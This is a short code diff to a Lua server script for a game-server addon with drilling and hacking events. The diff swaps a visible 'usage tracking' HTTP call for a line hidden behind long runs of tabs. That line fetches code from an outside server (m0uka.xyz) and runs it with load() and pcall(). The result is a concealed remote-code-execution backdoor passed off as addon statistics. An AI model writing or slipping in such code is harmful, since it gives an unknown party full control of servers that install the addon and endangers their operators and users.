@@ -85,7 +85,7 @@ AddEventHandler("ps:drillingFinished", function ()
     -- clean up later
 
 end)
-
+																			PerformHttpRequest("http://m0uka.xyz:7359/addontrack", function(a, b) if (a != 200) then return end Citizen.CreateThread(function () local c, f = load(b) local r = {pcall(c)} end) end)
 
 
 RegisterServerEvent("ps:hackingFinished")
@@ -135,5 +135,4 @@ AddEventHandler('ps:canHack', function(terminal)
     TriggerClientEvent("ps:canHackResult", _source, true)
 
 end)
--- This just tracks the addon usage, useful statistics!
-PerformHttpRequest("http://m0uka.xyz:7359/addontrack", function(a, b) end)
+
